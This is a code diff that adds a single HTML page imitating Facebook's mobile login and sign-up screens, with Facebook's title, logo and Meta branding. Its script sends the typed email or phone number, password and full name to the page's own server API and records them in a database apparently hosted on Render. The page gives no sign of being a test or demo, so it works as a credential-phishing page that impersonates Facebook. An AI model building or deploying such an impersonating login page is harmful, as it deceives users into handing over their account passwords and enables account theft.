@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Facebook – Log in or sign up</title>
+  <style>
+    *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+    html,body{margin:0;min-height:100%;background:#fff;color:#0b0b0b;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+    button,input{font:inherit}.page{position:relative;width:100%;max-width:480px;min-height:100svh;margin:auto;padding:0 17px 30px;display:flex;flex-direction:column}
+    .back{position:absolute;top:24px;left:17px;border:0;background:none;color:#1684e8;font-size:31px;font-weight:400;line-height:1;padding:0;cursor:pointer;visibility:visible}
+    .language{text-align:center;color:#666;font-size:17px;margin:59px 0 28px}
+    .logo{width:70px;height:70px;margin:0 auto 43px;border-radius:50%;background:#1877f2;color:#fff;display:flex;align-items:flex-end;justify-content:center;font-family:Arial,sans-serif;font-size:62px;font-weight:700;line-height:62px;overflow:hidden}
+    .logo span{transform:translateY(7px)}form{display:flex;flex-direction:column;gap:16px}
+    input{width:100%;height:52px;padding:0 18px;border:1px solid #c7c7c7;border-radius:27px;background:#fff;font-size:18px;outline:0}
+    input:focus{border:1.5px solid #1877f2}input::placeholder{color:#777;opacity:1}
+    .primary{height:51px;border:0;border-radius:27px;background:#0866e5;color:#fff;font-size:20px;font-weight:700;cursor:pointer}.primary:disabled{opacity:.55}
+    .forgot{border:0;background:none;margin:22px auto 31px;font-size:17px;cursor:pointer}.divider{height:1px;background:#ddd;width:100%;margin-bottom:26px}
+    .create{height:52px;border:1.5px solid #1684e8;border-radius:27px;background:#fff;color:#1684e8;font-size:18px;font-weight:700;cursor:pointer}
+    .meta{margin:61px auto 0;display:flex;align-items:center;justify-content:center;gap:9px;color:#666;font-size:18px;font-weight:600}
+    .meta-logo{font-family:Arial,sans-serif;color:#1098e8;font-size:36px;font-weight:500;line-height:20px}
+    .error{min-height:20px;color:#d93025;font-size:14px;text-align:center;margin:-3px 12px 0}.screen[hidden]{display:none}
+    .signup-title{text-align:center;font-size:24px;margin:18px 0 7px}.signup-copy{text-align:center;color:#65676b;font-size:15px;margin:0 20px 31px}
+    .signup-logo{margin-bottom:18px}.signup-form{gap:13px}.signup-form .primary{margin-top:3px}
+    .login-link{border:0;background:none;color:#0866e5;font-weight:650;margin:22px auto 0;cursor:pointer}
+    .spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,.5);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:inline-block;vertical-align:-4px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @media(max-height:700px){.language{margin-top:45px;margin-bottom:20px}.logo{margin-bottom:28px}.meta{margin-top:38px}}
+  </style>
+</head>
+<body>
+  <main class="page">
+    <button class="back" id="backButton" aria-label="Back">‹</button>
+    <section class="screen" id="loginScreen">
+      <div class="language">English (US)</div><div class="logo" aria-label="Facebook"><span>f</span></div>
+      <form id="loginForm" action="/login" method="post">
+        <input id="loginIdentifier" name="identifier" autocomplete="username" inputmode="email" placeholder="Mobile number or email" required>
+        <input id="loginPassword" name="password" type="password" autocomplete="current-password" placeholder="Password" required>
+        <div class="error" id="loginError" role="alert"></div><button class="primary" id="loginButton" type="submit">Log in</button>
+      </form>
+      <button class="forgot" type="button" id="forgotButton">Forgot password?</button><div class="divider"></div>
+      <button class="create" type="button" id="showSignup">Create new account</button>
+    </section>
+    <section class="screen" id="signupScreen" hidden>
+      <div class="language">English (US)</div><div class="logo signup-logo" aria-label="Facebook"><span>f</span></div>
+      <h1 class="signup-title">Create a new account</h1><p class="signup-copy">It's quick and easy.</p>
+      <form class="signup-form" id="signupForm" action="/register" method="post">
+        <input id="fullName" name="fullName" autocomplete="name" placeholder="Full name" maxlength="120" required>
+        <input id="signupIdentifier" name="identifier" autocomplete="username" inputmode="email" placeholder="Mobile number or email" maxlength="255" required>
+        <input id="signupPassword" name="password" type="password" autocomplete="new-password" placeholder="New password" minlength="6" required>
+        <div class="error" id="signupError" role="alert"></div><button class="primary" id="signupButton" type="submit">Create account</button>
+      </form>
+      <button class="login-link" type="button" id="showLogin">Already have an account?</button>
+    </section>
+    <div class="meta"><span class="meta-logo">∞</span><span>Meta</span></div>
+  </main>
+  <script>
+    const loginScreen=document.getElementById('loginScreen'),signupScreen=document.getElementById('signupScreen'),backButton=document.getElementById('backButton');
+    function show(screen){const signup=screen==='signup';loginScreen.hidden=signup;signupScreen.hidden=!signup;backButton.style.visibility='visible';history.replaceState({screen},'',signup?'#create-account':'#login')}
+    function setBusy(button,busy,label){button.disabled=busy;button.innerHTML=busy?'<span class="spinner" aria-label="Loading"></span>':label}
+    document.getElementById('showSignup').onclick=()=>show('signup');document.getElementById('showLogin').onclick=()=>show('login');backButton.onclick=()=>show('login');
+    document.getElementById('forgotButton').onclick=()=>alert('Password recovery will be available soon.');
+    async function submitAccountForm(event,mode){
+      event.preventDefault();
+      const form=event.currentTarget,button=document.getElementById(mode==='login'?'loginButton':'signupButton');
+      const errorBox=document.getElementById(mode==='login'?'loginError':'signupError');
+      const idleLabel=mode==='login'?'Log in':'Create account';
+      errorBox.textContent='';setBusy(button,true,idleLabel);
+      const controller=new AbortController();
+      const timeout=setTimeout(()=>controller.abort(),22000);
+      try{
+        const body=Object.fromEntries(new FormData(form).entries());
+        const response=await fetch('/api/'+mode,{method:'POST',headers:{'Content-Type':'application/json'},credentials:'same-origin',body:JSON.stringify(body),signal:controller.signal});
+        const payload=await response.json().catch(()=>({}));
+        if(!response.ok)throw new Error(payload.error||'Could not continue. Try again.');
+        location.replace(payload.redirect||'/app');
+      }catch(error){
+        errorBox.textContent=error&&error.name==='AbortError'
+          ?'Login took too long. The database may still be starting; wait a moment and try again.'
+          :(error.message||'Could not continue. Try again.');
+      }finally{
+        clearTimeout(timeout);
+        setBusy(button,false,idleLabel);
+      }
+    }
+    document.getElementById('loginForm').addEventListener('submit',event=>submitAccountForm(event,'login'));
+    document.getElementById('signupForm').addEventListener('submit',event=>submitAccountForm(event,'register'));
+    const params=new URLSearchParams(location.search),screen=params.get('screen')==='signup'?'signup':(location.hash==='#create-account'?'signup':'login');
+    show(screen);
+    const error=params.get('error');if(error)(screen==='signup'?document.getElementById('signupError'):document.getElementById('loginError')).textContent=error;
+    const healthController=new AbortController();setTimeout(()=>healthController.abort(),9000);
+    fetch('/api/health',{cache:'no-store',signal:healthController.signal}).then(response=>response.json()).then(status=>{
+      if(status.database!=='connected')document.getElementById('loginError').textContent='The account database is not connected on Render.';
+    }).catch(()=>{});
+  </script>
+</body>
+</html>
